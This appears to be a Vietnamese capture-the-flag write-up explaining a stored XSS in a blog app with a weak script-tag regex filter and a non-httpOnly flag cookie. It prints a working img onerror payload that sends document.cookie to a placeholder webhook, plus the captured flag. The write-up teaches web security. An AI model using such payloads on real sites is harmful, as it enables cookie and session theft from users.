# CTF Writeup: Let's remove script tag

## 1. Tổng quan (Overview)

* **Lỗ hổng:** Stored XSS.
* **Mục tiêu:** Đánh cắp Cookie của Admin Bot (nơi chứa Flag) thông qua lỗ hổng XSS trên ứng dụng Blog.

---

## 2. Phân tích mã nguồn (Source Code Analysis)

Hệ thống gồm 2 thành phần chính: Ứng dụng Blog (`server.js`) và Admin Bot (`bot.js`).

### **Điểm yếu 1: Bộ lọc (Sanitize) yếu kém tại Blog**
Trong file `server.js`, hàm `sanitize()` được dùng để làm sạch nội dung bài viết do người dùng nhập vào. Tuy nhiên, nó được cấu hình rất lỏng lẻo:

```javascript
function sanitize(html) {
  // Intentionally weak: only removes <script>...</script> blocks
  return html.replace(/<script[\s\S]*?<\/script>/gi, '');
}
```

Hàm này chỉ dùng Regex để xóa các thẻ `<script>...</script>`. Điều này cho phép kẻ tấn công sử dụng các thẻ HTML khác (như `<img>`, `<svg>`) kết hợp với Event Handlers (`onerror`, `onload`) để thực thi mã JavaScript (Payload).

Sau khi qua bộ lọc này, nội dung (biến `safeContent`) được nhúng trực tiếp vào giao diện HTML mà không bị mã hóa (encode) thêm lần nào nữa:

```html
<div class="content">${safeContent}</div>
```

### **Điểm yếu 2: Cookie không được bảo vệ**
Trong file `bot.js`, trước khi Admin Bot truy cập vào link bài viết, nó sẽ thiết lập một cookie chứa Flag:

```javascript
await page.setCookie({
  name: 'flag',
  value: FLAG,
  domain: hostname,
  path: '/',
  httpOnly: false, // <-- Điểm chí mạng
  sameSite: 'Lax',
});
```

Thuộc tính `httpOnly: false` cho phép mã JavaScript chạy trên trang web có thể đọc được toàn bộ nội dung của Cookie này thông qua `document.cookie`.

---

## 3. Khai thác (Exploitation Steps)

### **Bước 1: Chuẩn bị Payload và Webhook**
Sử dụng một dịch vụ nhận HTTP Request (như Webhook.site, RequestBin hoặc Burp Collaborator) để làm máy chủ nhận Flag. 
Payload XSS sử dụng thẻ `<img>` để qua mặt hàm sanitize:

```html
<img src="x" onerror="fetch('https://[YOUR_WEBHOOK_URL]/?c=' + document.cookie)">
```

> **Giải thích Payload:** Trình duyệt sẽ cố tải ảnh từ nguồn `x` (không tồn tại), dẫn đến lỗi và kích hoạt sự kiện `onerror`. Lệnh `fetch` bên trong sẽ gửi một GET request ngầm đến Webhook của kẻ tấn công, đính kèm `document.cookie` chứa Flag.

### **Bước 2: Chèn mã độc (Stored XSS)**
1. Truy cập vào ứng dụng Blog do hệ thống cung cấp.

<img width="1902" height="966" alt="image" src="https://github.com/user-attachments/assets/2ede7f51-3aaa-4f51-a6b6-46b195bccdfb" />

2. Tạo một bài viết mới (New Post).
3. Nhập tiêu đề bất kỳ và chèn đoạn Payload ở **Bước 1** vào phần Nội dung (Content).
4. Nhấn **Post** và copy lại đường dẫn URL của bài viết vừa tạo.

<img width="1637" height="489" alt="image" src="https://github.com/user-attachments/assets/41ec0f52-5c3a-4c69-b3d4-06f1c2db5d05" />

### **Bước 3: Gửi bẫy cho Admin Bot**
1. Truy cập vào giao diện của Admin Bot (`https://blog-admin.web.cpctf.space`).
2. Dán đường dẫn URL bài viết chứa mã độc vào ô Input.
3. Nhấn **Visit**.

---

## 4. Kết quả (Results)

Kiểm tra lại Webhook, ta sẽ thấy Admin Bot đã truy cập bài viết bị nhiễm XSS và gửi kèm Cookie chứa Flag về máy chủ của chúng ta.

<img width="1719" height="875" alt="image" src="https://github.com/user-attachments/assets/edd276a8-ab73-406a-9bc7-19d64331bfcf" />

**🚩 Flag:** `CPCTF{n0t_0nly_5cr1pt_t4g}`
